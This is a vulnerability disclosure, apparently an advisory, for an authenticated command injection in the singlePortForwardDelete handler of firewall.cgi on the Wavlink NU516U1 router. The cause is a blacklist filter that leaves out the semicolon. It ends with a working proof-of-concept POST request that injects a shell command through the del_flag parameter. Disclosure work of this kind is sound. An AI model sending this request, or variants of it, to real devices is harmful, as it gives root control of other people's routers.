# A remote command execution vulnerability exists in the `singlePortForwardDelete` function of the `firewall.cgi` component in the Wavlink NU516U1 (V251208) software.

### Overview

Supplier: Wavlink

Product: NU516U1 Version: WAVLINK-NU516U1-A-WO-20251208-BYFM

Type: command injection

### **Vulnerability description:**

A command injection vulnerability exists in the `/cgi-bin/firewall.cgi` component in Wavlink NU516U1 router firmware (version M16U1_V251208). The vulnerability is located in the **`sub_4016D0`** function that handles the **Port Forward Delete (singlePortForwardDelete)** functionality. When processing the `del_flag` parameter, the manufacturer calls the filter function `sub_405B2C` to check the user input. Although this function attempts to prevent command injection through a blacklist mechanism, its implementation is not rigorous and misses the key command delimiter semicolon (`;`). An authenticated remote attacker can bypass input validation by constructing a malicious **`del_flag`** parameter containing a semicolon, and use the `sprintf` function to splice arbitrary shell commands into a system call for execution, thereby taking full control of the device with root privileges.

### Vulnerability details

**Affected components**: `/cgi-bin/firewall.cgi`

**Affected functions**: `sub_4016D0` (main logic) & `sub_405B2C` (filter logic)

In the ftext function, get the value of the firewall parameter through user input. Setting the value of the firewall parameter to singlePortForwardDelete calls the sub_4016D0 function.

<img width="811" height="102" alt="image" src="https://github.com/user-attachments/assets/083267b1-59dc-4deb-bf6e-5415dad15459" />


### Main logic execution: `sub_4016D0` (triggering of vulnerability)

This function acts as an "executor" and blindly trusts the data checked by the above filter function.

- **Data flow**:

1. **Get input**: Get the HTTP parameter `del_flag` submitted by the user through `sub_4042C8("del_flag", ...)`.
2. **Call filtering**: Call `sub_405B2C(v2)` to check the input. If the function returns 1 (an illegal character is found), it exits with an error; if it returns 0 (it is considered safe), execution continues.
3. **Dangerous splicing**: After entering the `else` branch, the program uses the `sprintf` function to directly splice user input into the system command string: `sprintf(v5, "uci delete firewall.@redirect[%s]", v2);`.
4. **Command execution**: Finally call `sub_403734(v5)`. This is a wrapper of the `system()` function, which will directly hand the concatenated string to `/bin/sh` for execution.

<img width="1187" height="770" alt="image" src="https://github.com/user-attachments/assets/8bb38700-cdec-4ce5-a89f-7b7602b50dff" />


### Filtering logic failure: `sub_405B2C` (source of the vulnerability)

This function acts as a "security inspector", but its security check list misses one of the most dangerous contraband items.

- **How it works**: This function receives a string entered by the user, iterates through each character through a `while` loop, and uses the `strchr` function to check whether the character exists in a predefined "blacklist" string.
- **Blacklist content**: The blacklist defined in the code is very long: `"|`&<>$()"'[]{}*?!^~\#%"`. This covers most dangerous characters such as pipe characters, redirections, variable references, subshells, etc.
- **Fatal Flaw (Root Cause)**: **The only missing semicolon (**`;`**)** in the blacklist.

<img width="756" height="445" alt="image" src="https://github.com/user-attachments/assets/f2e8708a-8f8c-4ced-b74b-1ed3a3a333e6" />


### exp

**Utilization Conditions**: A valid Session Cookie is required.

Construct the data package:

```
POST /cgi-bin/firewall.cgi HTTP/1.1
Host: usblogin.link
Content-Length: 63
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://usblogin.link
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://usblogin.link/html/firewall.shtml
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: session=495266081
Connection: close

firewall=singlePortForwardDelete&del_flag=1;touch+/tmp/pwned;
```

<img width="1211" height="448" alt="image" src="https://github.com/user-attachments/assets/f11fa8c7-d392-4da1-8633-237f70d99595" />


Verification successful：

<img width="1129" height="162" alt="image" src="https://github.com/user-attachments/assets/a1477a4b-6d40-4910-89b5-cec4ead82415" />
